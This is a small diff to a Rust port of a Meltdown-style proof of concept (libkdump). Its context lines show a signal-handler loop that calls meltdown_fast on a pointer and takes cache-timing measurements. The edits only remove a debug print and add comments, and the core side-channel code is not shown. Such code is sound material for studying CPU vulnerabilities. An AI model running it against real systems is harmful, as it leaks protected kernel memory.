@@ -148,7 +148,6 @@ pub fn handle_signal() {
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
 	//println!("Called libkdump_read_signal_handler for pointer {:?}", pointer);
 	for iteration in 0..config.retries {
-		println!("Iteration {}", iteration);
 		unsafe {
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
@@ -185,6 +184,7 @@ pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPa
 	syscall(ThreadSwitch, &[]);
 	
 	for _ in 0..config.measurements {
+		// Per default, try loading and measuring the memory three times
 		// TODO: Add implementation using TSX?
 		// println!("Calling libkdump_read_signal_handler for pointer {:?}", pointer);
 		let r = libkdump_read_signal_handler(config, cache_miss_threshold, mem, pointer);
@@ -334,4 +334,5 @@ pub fn main() {
 		dealloc(ptr, layout);
 	}
 	println!("Done deallocating. Exiting.");
+	// TODO: fix `panicked at linked_list_allocator-0.10.5/src/hole.rs:548:9: Hole list out of order?!` after deallocation here
 }
